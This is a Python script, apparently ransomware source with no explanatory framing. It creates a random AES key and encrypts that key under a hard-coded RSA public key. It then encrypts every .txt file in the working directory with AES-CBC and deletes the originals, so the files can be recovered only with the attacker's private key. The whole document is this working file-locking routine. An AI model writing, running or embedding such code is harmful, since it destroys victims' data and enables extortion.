from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
def encrypt():
    e = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyNgDLRKByFlcanPPv0py
hQBB2hcnJ7/M3gFj5rwMTWbecS7Y27etI6iLf7R5rd6oe8pcYPG5Ol86eGfd3dfp
fIv6FjW7Zbrl3MArULLpCzT76Mg/f4LuVp1LDs2dH3HQE1vj96mXpQ7YwhVVu5x9
esIh2KgV+w2U9xH8+11zosVARGz1Bx1QL+yX0gpHhNCukq63OZGQ3SR4v4zbFS75
MqBPond4y2FLq/ElsPfiGjfNNtaATrCo9UXtWSACXmWp0i48wGiqIrJrVMy62Hvu
xKZ+vAErtdTKu65BWW9QgbpfB5kS7Mm54YKRJe3jcSRRIrK0lusxseDH8lEb1bR2
8QIDAQAB
-----END PUBLIC KEY-----"""
    k = get_random_bytes(16)
    cipher = PKCS1_v1_5.new(RSA.importKey(e))
    encryptedkey = cipher.encrypt(k)
    with open("EncryptedSharedKey", "wb") as file:
        file.write(encryptedkey)
    txtfiles = [f for f in os.listdir('.') if f.endswith('.txt')]
    kencryption = AES.new(k, AES.MODE_CBC)
    for txtfile in txtfiles:
        orig = open(txtfile, "rb")
        with open(txtfile + ".encrypted", "wb") as enc:
            enc.write(kencryption.iv)
            while True:
                data = orig.read(1024)
                if not data:
                    break
                enc.write(kencryption.encrypt(pad(data, AES.block_size)))
        os.remove(txtfile)
if __name__ == "__main__":
    encrypt()
